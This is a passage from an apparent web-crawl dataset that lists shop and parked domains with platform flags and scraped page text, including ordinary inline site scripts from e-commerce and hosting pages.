mineral water is sourced from pristine springs, where it flows through layers of natural minerals, picking up essential nutrients along the way. Contact Us ! Add to cart Himkan Mineral Water 1 Ltr Rated 5.00 out of 5 based on 1 customer rating ₹ 20.00 Add to cart Springs Alkaline Water Rated 5.00 out of 5 based on 1 customer rating ₹ 120.00 Add to cart Himkan Mineral Water 500 ML Rated 5.00 out of 5 based on 1 customer rating ₹ 10.00 Add to cart Energy Drink Rated 5.00 out of 5 based on 1 customer rating ₹ 100.00 Add to cart Sparkle Soda 750 ML Rated 5.00 out of 5 based on 1 customer rating ₹ 20.00 Add to cart Banta Jeera 250 ML Rated 5.00 out of 5 based on 1 customer rating ₹ 20.00 Ajay Himkan mineral water is my go-to for hydration! The crisp taste and refreshing quality make it perfect for my active lifestyle. I feel great knowing I'm drinking water rich in natural minerals! Radha As a fitness enthusiast, hydration is key. Himkan’s mineral water not only quenches my thirst but also supports my wellness goals. I can really taste the difference! Kirti Himkan mineral water has transformed my daily routine. I keep a bottle at my desk, and it keeps me focused and refreshed throughout the day. Highly recommend! Rakesh Himkan has quickly become a family favorite. We all appreciate the clean taste and the health benefits. It’s refreshing to know we’re drinking something so good for us! Priya Pure and refreshing! The taste of Himkan mineral water is unmatched. It's the only brand my family trusts for everyday hydration. Himkan mineral water has become a staple in our home. Rahul Himkan mineral water is my go-to after workouts. Exceptional quality! I’ve noticed a significant improvement in my energy levels since switching to Himkan mineral water. Highly recommended! Anita Reliable and consistent! Himkan delivers on its promise of purity every time. It’s our go-to choice for home and office use. Himkan stands out for its sustainable practices. Vikram Great service and sustainable packaging! Himkan not only provides excellent water but also ensures it’s eco-friendly. I appreciate their commitment to the environment. Made in India with pride Facebook Instagram Linkedin Quick Links Privacy Notice Terms Of Use Quality Report Hamburger Toggle Menu Reach Us Village Nangal Salangari,Tehsil And Distt Una Himachal Pradesh, Pin - 174303, India ucare@himkan.com info@himkan.com +91 7900740010 © Copyright 2024- Himkan. All Rights Reserved. Designed by Globose Tech {""prefetch"":[{""source"":""document"",""where"":{""and"":[{""href_matches"":""/*""},{""not"":{""href_matches"":[""/wp-*.php"",""/wp-admin/*"",""/wp-content/uploads/*"",""/wp-content/*"",""/wp-content/plugins/*"",""/wp-content/themes/oceanwp/*"",""/*\\?(.+)""]}},{""not"":{""selector_matches"":""a[rel~=\""nofollow\""]""}},{""not"":{""selector_matches"":"".no-prefetch, .no-prefetch a""}}]},""eagerness"":""conservative""}]} × × Cart ( () => { const lazyloadRunObserver = () => { const lazyloadBackgrounds = document.querySelectorAll( `.e-con.e-parent:not(.e-lazyloaded)` ); const lazyloadBackgroundObserver = new IntersectionObserver( ( entries ) => { entries.forEach( ( entry ) => { if ( entry.isIntersecting ) { let lazyloadBackground = entry.target; if( lazyloadBackground ) { lazyloadBackground.classList.add( 'e-lazyloaded' ); } lazyloadBackgroundObserver.unobserve( entry.target ); } }); }, { rootMargin: '200px 0px 200px 0px' } ); lazyloadBackgrounds.forEach( ( lazyloadBackground ) => { lazyloadBackgroundObserver.observe( lazyloadBackground ); } ); }; const events = [ 'DOMContentLoaded', 'elementor/lazyload/observe', ]; events.forEach( ( event ) => { document.addEventListener( event, lazyloadRunObserver ); } ); } )(); (function () { var c = document.body.className; c = c.replace("
805,circuitrycircus.com,unknown,,False,0,0,0,,False,False,,none,False,,none,False,0,False,False,"403 Forbidden Access to this resource on the server is denied! Proudly powered by LiteSpeed Web Server Please be advised that LiteSpeed Technologies Inc. is not a web hosting company and, as such, has no control over content found on this site."
806,tellusfilters.com,unknown,,False,0,0,0,,False,False,,none,False,,none,False,0,False,False,403 Forbidden
815,piecenapelletitalia.pl,unknown,,False,0,0,0,,False,False,,none,False,,none,False,0,False,False,
822,tupperstars.sk,woocommerce,woocommerce,True,0,0,0,,False,False,,none,False,,none,False,0,False,False,"// Flicker fix. Search Obľúbené Prihlásiť / Registrovať 0 položky 0,00 € Menu 0 položky 0,00 € Kategórie Mesačná ponuka Výpredaj ECO+ Katalóg Kuchynské náradie Mikrovlákno Mikrovlná rúra Mraznička Novinky Nože Pečenie Recycline Servírovanie Skladovanie Špeciálna ponuka Ultra pro Tupperware akcia Obchod Úvod O nás Blog Kontakt +421 911 195 854 #slider-72 .wd-slide { min-height: 600px; } @media (max-width: 1024px) { #slider-72 .wd-slide { min-height: 500px; } } @media (max-width: 768px) { #slider-72 .wd-slide { min-height: 500px; } } #slide-151 .wd-slide-container { --wd-align-items: center; --wd-justify-content: left; } #slide-151.woodmart-loaded .wd-slide-bg { background-image:url(http://tupperstars.sk/wp-content/uploads/2023/04/test2.jpg); } #slide-151 .wd-slide-bg { background-color:rgb(176,179,168); background-size:cover; background-position:center center; } #slide-151 .wd-slide-inner { max-width:1200px; } @media (max-width: 1024px) { #slide-151 .wd-slide-inner { max-width:1200px; } #slide-151 .wd-slide-bg { background-position:-120px 0px; } } @media (max-width: 768px) { #slide-151 .wd-slide-inner { max-width:500px; } #slide-151 .wd-slide-bg { background-position:-360px 0px; } } .elementor-151 .elementor-element.elementor-element-95277bd{--display:flex;--flex-direction:row;--container-widget-width:initial;--container-widget-height:100%;--container-widget-flex-grow:1;--container-widget-align-self:stretch;--gap:10px 10px;--flex-wrap:wrap;--background-transition:0.3s;--margin-block-start:0px;--margin-block-end:40px;--margin-inline-start:60px;--margin-inline-end:0px;}.elementor-151 .elementor-element.elementor-element-b462ee3 .wd-text-block{font-family:""Urbanist"", Sans-serif;font-size:46px;font-weight:800;line-height:1em;color:#242424CC;}.elementor-151 .elementor-element.elementor-element-b462ee3{width:100%;max-width:100%;}.elementor-151 .elementor-element.elementor-element-5ba269c{--display:flex;--flex-direction:row;--container-widget-width:calc( ( 1 - var( --container-widget-flex-grow ) ) * 100% );--container-widget-height:100%;--container-widget-flex-grow:1;--container-widget-align-self:stretch;--align-items:center;--gap:10px 15px;--background-transition:0.3s;--margin-block-start:0px;--margin-block-end:0px;--margin-inline-start:60px;--margin-inline-end:0px;}.elementor-151 .elementor-element.elementor-element-95cc826 .wd-button-wrapper a{background-color:#F69F60;border-color:#F69F60;}.elementor-151 .elementor-element.elementor-element-95cc826 .wd-button-wrapper:hover a{background-color:#FFAF75;border-color:#FFAF75;}.elementor-151 .elementor-element.elementor-element-95cc826 .wd-btn-text{font-size:26px;}.elementor-151 .elementor-element.elementor-element-95cc826{width:auto;max-width:auto;}@media(max-width:1024px){.elementor-151 .elementor-element.elementor-element-95277bd{--margin-block-start:0px;--margin-block-end:40px;--margin-inline-start:40px;--margin-inline-end:0px;}.elementor-151 .elementor-element.elementor-element-b462ee3 .wd-text-block{font-size:36px;}.elementor-151 .elementor-element.elementor-element-5ba269c{--margin-block-start:0px;--margin-block-end:0px;--margin-inline-start:40px;--margin-inline-end:0px;}}@media(max-width:768px){.elementor-151 .elementor-element.elementor-element-95277bd{--margin-block-start:0px;--margin-block-end:40px;--margin-inline-start:24px;--margin-inline-end:0px;}.elementor-151 .elementor-element.elementor-element-b462ee3 .wd-text-block{max-width:80%;font-size:28px;}.elementor-151 .elementor-element.elementor-element-5ba269c{--margin-block-start:0px;--margin-block-end:0px;--margin-inline-start:24px;--margin-inline-end:0px;}} Všetky Tupperware produkty pod jednou strechou Zobraziť produkty Kategórie Na našej stránke nájdete množstvo zaujímavých produktov DARČEKOVÁ POUKÁŽKA (3) 3 produkty kľúčenka (17) 17 produktov MERIANO home (16) 16 produktov Náhradný diel (8) 8 produktov TOVAR (nie od Tupperware) (11) 11 produktov Mesačná ponuka (5) 5 produktov Výpredaj 0 produktov ECO+ (21) 21 produktov Katalóg 0 produktov Kuchynské náradie (28) 28 produktov Mikrovlákno (3) 3 produkty Mikrovlná rúra (14) 14 produktov Mraznička (13) 13 produktov Novinky (7) 7 produktov Nože (4) 4 produkty Pečenie (12) 12 produktov Recycline 0 produktov Servírovanie (11) 11 produktov Skladovanie (15) 15 produktov Špeciálna ponuka (47) 47 produktov TUPPERWARE AKCIA (187) 187 produktov Ultra pro (4) 4 produkty Najpredávanejšie produkty TOP Pridať do obľúbených Škrabka na citrusy TUPPERWARE AKCIA 1,00 € s DPH Pridať do košíka Rýchly náhľad Pridať do obľúbených Lopatka TUPPERWARE AKCIA 4,00 € s DPH Pridať do košíka Rýchly náhľad Pridať do obľúbených Utierka na sklo 2 ks Mikrovlákno , TUPPERWARE AKCIA 33,90 € s DPH Pridať do košíka Rýchly náhľad Pridať do obľúbených eco+ vodička II 750 ml. sosák ECO+ , TUPPERWARE AKCIA 13,90 € s DPH Pridať do košíka Rýchly náhľad TOP Pridať do obľúbených Kefa na vodičky Kuchynské náradie , TUPPERWARE AKCIA 14,90 € s DPH Pridať do košíka Rýchly náhľad Pridať do obľúbených Horúca vlnka 1,4 lit Mikrovlná rúra , TUPPERWARE AKCIA 22,90 € s DPH Pridať do košíka Rýchly náhľad Vypredané Pridať do obľúbených Sada fľaše SLIM -750 ml – 3 ks – farby ako na obrázku ECO+ , TUPPERWARE AKCIA 36,90 € s DPH Viac info Rýchly náhľad Pridať do obľúbených Optimum II servírovacia lyžica Kuchynské náradie , TUPPERWARE AKCIA 14,90 € s DPH Pridať do košíka Rýchly náhľad -13% Pridať do obľúbených eco+ vodička II 750 ml. – sosák ECO+ , TUPPERWARE AKCIA 15,90 € 13,90 € s DPH Pridať do košíka Rýchly náhľad -27% Pridať do obľúbených Valček Kuchynské náradie , Mesačná ponuka , Pečenie 21,90 € 15,90 € s DPH Pridať do košíka Rýchly náhľad Product collections Explore product collections from our vendors GLADØM The new common language will be more simple and regular than the existing languages HÄLLAN The new common language will be more simple and regular than the existing languages Furniture collection of the week The most popular products from the collection Misky pre vašu kuchyňu Tuppers"
826,mandycamerondesigns.com,unknown,,False,0,0,0,,False,False,,none,False,,none,False,0,False,False,
840,sunandfinecrop.com,unknown,,False,0,0,0,,False,False,,none,False,,none,False,0,False,False,"Registered at If this is your domain, you can manage it in your Hostinger account. Manage domain Start your online journey Build your website today Launch your business with WordPress or Website Builder using AI tools, templates, and reliable hosting. Get Web hosting Prompt your website Chat with AI to build a complete website - with CRM, booking forms, and more. Horizons handles code, design, and copy so you can launch instantly. Get Horizons Power your projects with VPS Get full control with dedicated resources. Scale apps, websites, and workloads on secure VPS hosting. Get VPS hosting Find similar domains Explore available alternatives and secure the domain that works best for your brand. Search domains Look professional with email Create a business email that matches your domain. Build your brand with a professional email address like info@example.com . Create email // Punycode implementationvar punycode=new function (){ this.utf16={ decode: function (o){ for (var r, e, n=[], t=0, a=o.length; t < a;){ if (55296==(63488 & (r=o.charCodeAt(t++)))){ if (e=o.charCodeAt(t++), 55296 !=(64512 & r) || 56320 !=(64512 & e)) throw new RangeError(""UTF-16(decode): Illegal UTF-16 sequence""); r=((1023 & r) << 10) + (1023 & e) + 65536} n.push(r)} return n}, encode: function (o){ for (var r, e=[], n=0, t=o.length; n < t;){ if (55296==(63488 & (r=o[n++]))) throw new RangeError(""UTF-16(encode): Illegal UTF-16 value""); 65535 < r && (r -=65536, e.push(String.fromCharCode(r >10 & 1023 | 55296)), r=56320 | 1023 & r), e.push(String.fromCharCode(r))} return e.join("""")}}; var o=36, r=2147483647; function e(o, r){ return o + 22 + 75 * (o < 26) - ((0 !=r) << 5)} function n(r, e, n){ var t; for (r=n ? Math.floor(r / 700) : r >1, r +=Math.floor(r / e), t=0; 455 < r; t +=o)r=Math.floor(r / 35); return Math.floor(t + 36 * r / (r + 38))} this.decode=function (e, t){ var a, h, f, i, c, u, d, l, p, g, s, C, w, v, m=[], y=[], E=e.length; for (a=128, f=0, i=72, (c=e.lastIndexOf(""-"")) < 0 && (c=0), u=0; u < c; ++u){ if (t && (y[m.length]=e.charCodeAt(u) - 65 < 26), 128 <=e.charCodeAt(u)) throw new RangeError(""Illegal input >=0x80""); m.push(e.charCodeAt(u))} for (d=0 < c ? c + 1 : 0; d < E;){ for (l=f, p=1, g=o; ; g +=o){ if (E <=d) throw RangeError(""punycode_bad_input(1)""); if (v=e.charCodeAt(d++), o <=(s=v - 48 < 10 ? v - 22 : v - 65 < 26 ? v - 65 : v - 97 < 26 ? v - 97 : o)) throw RangeError(""punycode_bad_input(2)""); if (s >Math.floor((r - f) / p)) throw RangeError(""punycode_overflow(1)""); if (f +=s * p, s < (C=g <=i ? 1 : i + 26 <=g ? 26 : g - i)) break; if (p >Math.floor(r / (o - C))) throw RangeError(""punycode_overflow(2)""); p *=o - C} if (i=n(f - l, h=m.length + 1, 0===l), Math.floor(f / h) >r - a) throw RangeError(""punycode_overflow(3)""); a +=Math.floor(f / h), f %=h, t && y.splice(f, 0, e.charCodeAt(d - 1) - 65 < 26), m.splice(f, 0, a), f++} if (t) for (f=0, w=m.length; f < w; f++)y[f] && (m[f]=String.fromCharCode(m[f]).toUpperCase().charCodeAt(0)); return this.utf16.encode(m)}, this.encode=function (t, a){ var h, f, i, c, u, d, l, p, g, s, C, w; a && (w=this.utf16.decode(t)); var v=(t=this.utf16.decode(t.toLowerCase())).length; if (a) for (d=0; d < v; d++)w[d]=t[d] !=w[d]; var m, y=[]; for (h=128, u=72, d=f=0; d < v; ++d)t[d] < 128 && y.push(String.fromCharCode(w ? (m=t[d], (m -=(m - 97 < 26) << 5) + ((!w[d] && m - 65 < 26) << 5)) : t[d])); for (i=c=y.length, 0 < c && y.push(""-""); i < v;){ for (l=r, d=0; d < v; ++d)h <=(C=t[d]) && C < l && (l=C); if (l - h >Math.floor((r - f) / (i + 1))) throw RangeError(""punycode_overflow (1)""); for (f +=(l - h) * (i + 1), h=l, d=0; d < v; ++d){ if ((C=t[d]) < h && ++f >r) return Error(""punycode_overflow(2)""); if (C==h){ for (p=f, g=o; !(p < (s=g <=u ? 1 : u + 26 <=g ? 26 : g - u)); g +=o)y.push(String.fromCharCode(e(s + (p - s) % (o - s), 0))), p=Math.floor((p - s) / (o - s)); y.push(String.fromCharCode(e(p, a && w[d] ? 1 : 0))), u=n(f, i + 1, i==c), f=0, ++i}} ++f, ++h} return y.join("""")}, this.ToASCII=function (o){ for (var r=o.split("".""), e=[], n=0; n < r.length; ++n){ var t=r[n]; e.push(t.match(/[^A-Za-z0-9-]/) ? ""xn--"" + punycode.encode(t) : t)} return e.join(""."")}, this.ToUnicode=function (o){ for (var r=o.split("".""), e=[], n=0; n < r.length; ++n){ var t=r[n]; e.push(t.match(/^xn--/) ? punycode.decode(t.slice(4)) : t)} return e.join(""."")}};// Set domain name in title and email examplevar pathName=window.location.hostname;var unicodeDomain=punycode.ToUnicode(pathName);// Use fallback if domain is empty or invalidif (!unicodeDomain || unicodeDomain.trim()===''){ unicodeDomain='domain.com'}var account=document.getElementById(""pathName"");account.innerHTML=unicodeDomain;// Set email examplevar emailExample=document.getElementById(""emailExample"");emailExample.innerHTML=""info@"" + unicodeDomain;// Domain search functionalityfunction sanitizeDomain(input){ // Remove whitespace and convert to lowercase var sanitized=input.trim().toLowerCase(); // Remove protocol if present sanitized=sanitized.replace(/^https?:\/\//, ''); // Remove www. if present sanitized=sanitized.replace(/^www\./, ''); // Remove trailing slash sanitized=sanitized.replace(/\/$/, ''); // Only allow valid domain characters: letters, numbers, dots, hyphens sanitized=sanitized.replace(/[^a-z0-9.-]/g, ''); // Remove multiple consecutive dots sanitized=sanitized.replace(/\.{2,}/g, '.'); // Remove leading/trailing dots and hyphens sanitized=sanitized.replace(/^[.-]+|[.-]+$/g, ''); return sanitized}document.getElementById('searchDomainsBtn').addEventListener('click', function(e){ e.preventDefault(); var domainInput=document.getElementById('domainInput'); var domain=sanitizeDomain(domainInput.value); var baseUrl='https://www.hostinger.com/domain-name-results?utm_source=parked-domain&utm_medium=referral'; if (domain && domain.length >0){ // Add domain parameter if input is not empty window.open(baseUrl + '&domain=' + encodeURIComponent(domain), '_blank');} else{ // No domain parameter if input is empty window.open(baseUrl,"
872,gamatilbod.com,woocommerce,woocommerce,True,4,0,0,$,True,False,Netfangið þitt,none,True,generic,none,False,0,False,False,"Fara í efni Heim Gámatilboð Hafðu samband Innskráning Heim Gámatilboð Hafðu samband Innskráning Heim Gámatilboð Hafðu samband Innskráning Heim Gámatilboð Hafðu samband Innskráning VELKOMIN Á VEFSÍÐU OKKAR GAMATILBOD.IS Aukum kaupmáttinn - Saman Hafa samband Fyrsti gámurinn okkar er kominn í land! Vörur til afhendingar núna Rafmagnsbíll (setu) fyrir börn Þessi rafmagnsbíll fyrir börn er fullkominn fyrir þau litlu sem vilja geta keyrt um með stæl hvort sem er innan eða utandyra. Að keyra um í öflugum lúxus bíl með alvöru 4WD, hljóðkerfi og fjarstýringu til að tryggja öryggi er nú upplifun sem þú getur gefið barninu í lífi þínu. ÚTSALA! Lúxus Betsy dýna Upplifðu einstaka hvíld með Betsy lúxusdýnunni okkar, sem er smíðuð með einstöku pokafjöðrunarkerfi sem veitir hámarks stuðning fyrir líkamann og dregur úr þrýsting á álagspunktum líkamans. Frábært verð og fáanleg í mismunandi stærðum. Skoðaðu verslun okkar Gámatilboðin Okkar Skoða Gámatilboðin Okkar aðal markmið er ánægja viðskiptavina okkar með því að útvega gæða vörur og framúrskarandi þjónustu á frábæru verði Frekari upplýsingar Okkar aðal markmið er ánægja viðskiptavina okkar með því að útvega gæða vörur og framúrskarandi þjónustu á frábæru verði Frekari upplýsingar Af hverju að kaupa frá okkur? Snjallari kaupmáttur Með því að nýta kaupmátt hópkaupa getum við samið um mun betri verð við framleiðendur og dreifingaraðila til að hjálpa þér að spara í kaupunum þínum. Þjónusta á persónulegu stigi Ekkert gisk. Þú munt vita nákvæmlega hvað þú færð sem þú pantaðir og hvenær þú færð það afhent. Gæðavörur á viðráðanlegu verði Vöruframboð okkar uppfyllir ströngustu öryggisstaðla ESB og eru látnar ganga gegnum strangar gæðaprófanir óháðra samstarfsaðila okkar áður en við bjóðum vörurnar til sölu. Hraður afgreiðslutími Frá verksmiðju að dyrum þínum er þrælreynd keðja flutningsaðila okkar sett upp til að tryggja skjótan, öruggan og greiðan flutningstíma. Af hverju að kaupa frá okkur? Snjallari kaupmáttur Með því að nýta kaupmátt hópkaupa getum við samið um mun betri verð við framleiðendur og dreifingaraðila til að hjálpa þér að spara í kaupunum þínum. Þjónusta á persónulegu stigi Ekkert gisk. Þú munt vita nákvæmlega hvað þú færð sem þú pantaðir og hvenær þú færð það afhent. Hraður afgreiðslutími Frá verksmiðju að dyrum þínum er þrælreynd keðja flutningsaðila okkar sett upp til að tryggja skjótan, öruggan og greiðan flutningstíma. Gæðavörur á frábæru verði Vöruframboð okkar uppfyllir ströngustu öryggisstaðla ESB og eru látnar ganga gegnum strangar gæðaprófanir óháðra samstarfsaðila okkar áður en við bjóðum vörurnar til sölu. Við aukum kaupmátt þinn Aðgangurinn minn Sími: +354 896 1612 Netfang: info@gamatilbod.is Opnunartími: Mán-fös 11:00 - 15:00 Skilmálar okkar Persónuverndarstefna © 2025 Gamatilbod.is Skilmálar okkar Persónuverndarstefna © 2025 Gamatilbod.is {""prefetch"":[{""source"":""document"",""where"":{""and"":[{""href_matches"":""/is/*""},{""not"":{""href_matches"":[""/wp-*.php"",""/wp-admin/*"",""/wp-content/uploads/*"",""/wp-content/*"",""/wp-content/plugins/*"",""/wp-content/themes/hello-elementor-child/*"",""/wp-content/themes/hello-elementor/*"",""/is/*\\?(.+)""]}},{""not"":{""selector_matches"":""a[rel~=\""nofollow\""]""}},{""not"":{""selector_matches"":"".no-prefetch, .no-prefetch a""}}]},""eagerness"":""conservative""}]} Heim Gámatilboð Innskráning Hafðu samband Skráðu þig á fréttabréfið okkar Fáðu nýjustu tilboðin okkar beint í pósthólfið þitt! Netfangið þitt Skráðu þig núna Innskráning á aðganginn þinn Innskráning Gleymdirðu lykilorðinu þínu? (function () { var c = document.body.className; c = c.replace(/woocommerce-no-js/, 'woocommerce-js'); document.body.className = c; })(); var trp_data = {""trp_custom_ajax_url"":""https://gamatilbod.com/wp-content/plugins/translatepress-multilingual/includes/trp-ajax.php"",""trp_wp_ajax_url"":""https://gamatilbod.com/wp-admin/admin-ajax.php"",""trp_language_to_query"":""is_IS"",""trp_original_language"":""en_US"",""trp_current_language"":""is_IS"",""trp_skip_selectors"":[""[data-no-translation]"",""[data-no-dynamic-translation]"",""[data-trp-translate-id-innertext]"",""script"",""style"",""head"",""trp-span"",""translate-press"",""#billing_country"",""#shipping_country"",""#billing_state"",""#shipping_state"",""#select2-billing_country-results"",""#select2-billing_state-results"",""#select2-shipping_country-results"",""#select2-shipping_state-results"",""[data-trp-translate-id]"",""[data-trpgettextoriginal]"",""[data-trp-post-slug]""],""trp_base_selectors"":[""data-trp-translate-id"",""data-trpgettextoriginal"",""data-trp-post-slug""],""trp_attributes_selectors"":{""text"":{""accessor"":""outertext"",""attribute"":false},""block"":{""accessor"":""innertext"",""attribute"":false},""image_src"":{""selector"":""img[src]"",""accessor"":""src"",""attribute"":true},""submit"":{""selector"":""input[type='submit'],input[type='button'], input[type='reset']"",""accessor"":""value"",""attribute"":true},""placeholder"":{""selector"":""input[placeholder],textarea[placeholder]"",""accessor"":""placeholder"",""attribute"":true},""title"":{""selector"":""[title]"",""accessor"":""title"",""attribute"":true},""a_href"":{""selector"":""a[href]"",""accessor"":""href"",""attribute"":true},""button"":{""accessor"":""outertext"",""attribute"":false},""option"":{""accessor"":""innertext"",""attribute"":false},""aria_label"":{""selector"":""[aria-label]"",""accessor"":""aria-label"",""attribute"":true},""video_src"":{""selector"":""video[src]"",""accessor"":""src"",""attribute"":true},""video_poster"":{""selector"":""video[poster]"",""accessor"":""poster"",""attribute"":true},""video_source_src"":{""selector"":""video source[src]"",""accessor"":""src"",""attribute"":true},""audio_src"":{""selector"":""audio[src]"",""accessor"":""src"",""attribute"":true},""audio_source_src"":{""selector"":""audio source[src]"",""accessor"":""src"",""attribute"":true},""picture_image_src"":{""selector"":""picture image[src]"",""accessor"":""src"",""attribute"":true},""picture_source_srcset"":{""selector"":""picture source[srcset]"",""accessor"":""srcset"",""attribute"":true}},""trp_attributes_accessors"":[""outertext"",""innertext"",""src"",""value"",""placeholder"",""title"",""href"",""aria-label"",""poster"",""srcset""],""gettranslationsnonceregular"":""d1917f2554"
875,www.zetaeffeshop.it,unknown,,False,0,0,0,,False,False,,none,False,,none,False,0,False,False,"document.getElementById(""title"").innerHTML = window.location.hostname; This account has been suspended .st0{fill:#FFFFFF;} .st1{fill:#C1E9F4;} .st2{fill:#A3D5E9;} .st3{fill:#EAEAEA;} .st4{fill:#FDFDFF;} .st5{fill:#BFBFBF;} .st6{opacity:0.16;fill:#C1E9F4;} .st7{clip-path:url(#XMLID_3_);fill:#FFFFFF;} .st8{fill:#14103D;} .st9{fill:#EB8175;} .st10{fill:#418C41;} .st11{fill:#50AA50;} .st12{fill:#E1AD9D;} .st13{fill:#C8C6F2;} .st14{fill:#D8D7FD;} .st15{fill:#091218;} .st16{fill:#1B2934;} .st17{fill:#E16C5F;} .st18{clip-path:url(#XMLID_4_);fill:#231C61;} .st19{fill:#F5D100;} .st20{fill:none;stroke:#F1AB00;stroke-width:0.2802;stroke-miterlimit:10;} .st21{fill:none;stroke:#FFFFFF;stroke-width:1.1206;stroke-linecap:round;stroke-linejoin:round;stroke-miterlimit:10;} .st22{fill:none;stroke:#106797;stroke-width:2.1624;stroke-miterlimit:10;} .st23{fill:none;stroke:#FFFFFF;stroke-width:1.1138;stroke-miterlimit:10;} .st24{fill:#106797;} .st25{fill:#0F5A7C;} .st26{fill:none;stroke:#106797;stroke-width:2.6489;stroke-linecap:round;stroke-linejoin:round;stroke-miterlimit:10;} Either the domain has been overused, or the reseller ran out of resources. Powered by .st007 { fill: #8F9195; } .ssst1 { fill: #34383C; } .ssst2 { fill: #0682B4; } .ssst3 { fill: #31B7E9; }"
884,ngbtelecoms.com,woocommerce,woocommerce,True,0,0,0,USD,True,False,Email *,none,False,,none,False,0,False,False,"(function(){var w=document.documentElement.clientWidth;if(w>0&&w<=921){document.body.classList.add('ast-header-break-point');document.body.classList.remove('ast-desktop');}})(); Aller au contenu Médina RUE 34 X 43 en face bureau des HLM 78 011 04 04 contact@ngbtelecoms.com Shipping & return Track order Demander un devis Demander un devis Search for: Acceuil Shop Catégories Réseau & Infrastructure Routeurs Switchs Point d’accès Wifi Panneaux Coffrets Câblage & Connectique Fibre Optique Modules SFP Modules informatiques Câbles HDMI Jartières Cordons Câbles informatiques Téléphonie IP / VoIP Téléphones IP Passerelles VoIP IPBX Sécurité & Surveillance Caméras IP NVR Accessoires & Alimentation Injecteurs Adaptateurs Supports muraux Accessoires Serveurs et Stockage Serveurs Disque dur A propos Nouvel Arrivage Contact Log In Médina RUE 34 X 43 en face bureau des HLM 78 011 04 04 contact@ngbtelecoms.com Acceuil Shop Catégories Réseau & Infrastructure Routeurs Switchs Point d’accès Wifi Panneaux Coffrets Câblage & Connectique Fibre Optique Modules SFP Modules informatiques Câbles HDMI Jartières Cordons Câbles informatiques Téléphonie IP / VoIP Téléphones IP Passerelles VoIP IPBX Sécurité & Surveillance Caméras IP NVR Accessoires & Alimentation Injecteurs Adaptateurs Supports muraux Accessoires Serveurs et Stockage Serveurs Disque dur A propos Nouvel Arrivage Contact Des solutions télécoms et réseaux pour les professionnels. Solutions et équipements télécoms professionnels — tout pour vos infrastructures réseau et connectivité Découvrez nos produits Livraison gratuite Pour un achat de plus de 200000 Fcfa Nous sommes disponible 24/7 Besoin d'aide ? Contactez-nous ! Satisfait ou remboursé Tous nos produits sont garantis Paiements 100% sécurisés Visa, Mastercard, Stripe, PayPal Achetez par catégorie Accessoires & Alimentation Câblage & Connectique 35 produits Réseau & Infrastructure 124 produits Sécurité & Surveillance 13 produits Serveurs et Stockage 15 produits Téléphonie IP / VoIP 64 produits Ubiquiti — la performance réseau au service de vos connexions. Acheter maintenant Grandstream — la communication IP simple, efficace et professionnelle. Acheter maintenant Offres exeptionnelles Voir Plus Produits Ubiquiti A partir de 80.000 Fcfa Commandez dès maintenant Téléphonie sur IP A partir de 150.000 Fcfa Commandez dès maintenant Fibre optique A partir de 20.000 Fcfa Commandez dès maintenant Téléphonie Voir Plus Demander un devis UTP-G3-TOUCH-ENTERPRISE Téléphones IP Demander un devis Demander un devis UTP-G3-TOUCH-PRO Téléphones IP Demander un devis Demander un devis PHONE GRANDSTREAM GHP621 Téléphones IP Demander un devis Demander un devis PHONE GRANDSTREAM GHP620W Téléphones IP Demander un devis Point d'accès Voir Plus Demander un devis UA-G3-SK Point d'accès Wifi Demander un devis Demander un devis RD-5G30 Point d'accès Wifi Demander un devis Demander un devis AM-5AC21-60 Point d'accès Wifi Demander un devis Demander un devis PBE-M5-400 Point d'accès Wifi Demander un devis Fibre Optique Voir Plus Ajouter au panier Fibre Optique 48 Brins Mono 2.000 CFA Fibre Optique Ajouter au panier Ajouter au panier Fibre Optique 24 Brins Mono 1.500 CFA Fibre Optique Ajouter au panier Ajouter au panier Fibre Optique OM4 12 Brins 1.800 CFA Fibre Optique Ajouter au panier Ajouter au panier Fibre Optique OM4 6 Brins 1.200 CFA Fibre Optique Ajouter au panier Modules SFP Voir Plus Demander un devis MODULE UACC-OM6SFP28-LR Modules SFP Demander un devis Demander un devis MODULE UACC-OM-SM-1G-S-2 Modules SFP Demander un devis Demander un devis MODULE UACC-OM-MM-1G-D Modules SFP Demander un devis Ajouter au panier Modules SFP monomode Ubiquiti UF-SM-1G-S 30.000 CFA Modules SFP Ajouter au panier VidéoSurveillance Voir Plus Ajouter au panier Ubiquiti Camera UVC-G5-Bullet 140.000 CFA Caméras IP Ajouter au panier Ajouter au panier Caméra 4mp hikvision Colorvu 50.000 CFA Caméras IP Ajouter au panier Ajouter au panier Caméra 2mp hikvision Colorvu 40.000 CFA Caméras IP Ajouter au panier Ajouter au panier Caméra hikvision 4 MP 40.000 CFA Caméras IP Ajouter au panier Bon plan marque Équipez-vous en Ubiquiti à prix réduit — jusqu’à 100.000 F d’économie. Commandez dès maintenant Nos partenaires Service Commercial 78 011 04 04 Support 77 523 28 05 Vous avez des questions? Contactez nous Souscrire à notre newsletter Inscrivez-vous pour recevoir toutes les dernières nouvelles et offres spéciales Formulaire d'inscription Veuillez activer JavaScript dans votre navigateur pour remplir ce formulaire. Email * S'inscrire Panier Boutique Offres exceptionnelles Categories Marques Offre de la semaine Besoin d'aide? Contact Suivi des commandes FAQs Return policy Privacy policy Contact Médina RUE 34 X 43 en face bureau des HLM contact@ngbtelecoms.com 77 523 28 05 | 78 011 04 04 © 2026 Niang Global Business Telecoms. Powered by Niang Global Business Telecoms {""prefetch"":[{""source"":""document"",""where"":{""and"":[{""href_matches"":""\/*""},{""not"":{""href_matches"":[""\/wp-*.php"",""\/wp-admin\/*"",""\/wp-content\/uploads\/*"",""\/wp-content\/*"",""\/wp-content\/plugins\/*"",""\/wp-content\/themes\/astra\/*"",""\/*\\?(.+)""]}},{""not"":{""selector_matches"":""a[rel~=\""nofollow\""]""}},{""not"":{""selector_matches"":"".no-prefetch, .no-prefetch a""}}]},""eagerness"":""conservative""}]} jQuery(document).ready(function($) { // Pour tous les liens vers demande-de-devis $('a[href*=""demande-de-devis""]').on('click', function(e) { var href = $(this).attr('href'); if (href && href.indexOf('demande-de-devis') !== -1) { e.preventDefault(); e.stopPropagation(); window.location.href = href; return false; } }); }); (function() { // Global page view and session tracking for UAEL Modal Popup feature try { // Session tracking: increment if this is a new session // Check if any popup on this page uses current page tracking var hasCurrentPageTracking = false; var currentPagePopups = []; // Check all modal popups on this page for current page tracking if (typeof jQuery !== 'undefined') { jQuery('.uael-modal-par"
